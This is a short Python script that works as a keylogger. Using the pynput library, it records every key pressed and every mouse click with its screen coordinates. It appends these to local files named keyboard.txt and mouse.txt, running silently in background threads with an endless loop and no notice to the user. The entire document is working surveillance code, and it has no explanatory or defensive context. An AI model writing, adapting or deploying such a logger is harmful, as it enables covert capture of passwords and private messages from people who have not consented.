
from pynput import mouse,keyboard
import sys
from _thread import start_new_thread


def mouse_log( x , y , button , pressed ):
    f = open('mouse.txt','a')
    x = str(x)
    y = str(y)
    button = str(button)
    pressed = str(pressed)
    f.write("( x , y ) = ( "+x+" , "+y+" ) "+" , Button = "+button+" , Pressed is "+pressed+"\n")
    f.close()
def mouse_begin(ID):
    with mouse.Listener( on_click = mouse_log ) as lstn :
        lstn.join()


def keyboard_log( key ):
    if type(key) == keyboard._win32.KeyCode:
        k = key.char
    else:
        k = str(key)
    f = open('keyboard.txt','a')
    f.write(' '+k+' ')
    f.close()
def keyboard_begin(ID):
    with keyboard.Listener( on_press = keyboard_log ) as lstn :
        lstn.join()


start_new_thread (keyboard_begin , tuple([2]))
start_new_thread (mouse_begin , tuple([1]))

while True :
    pass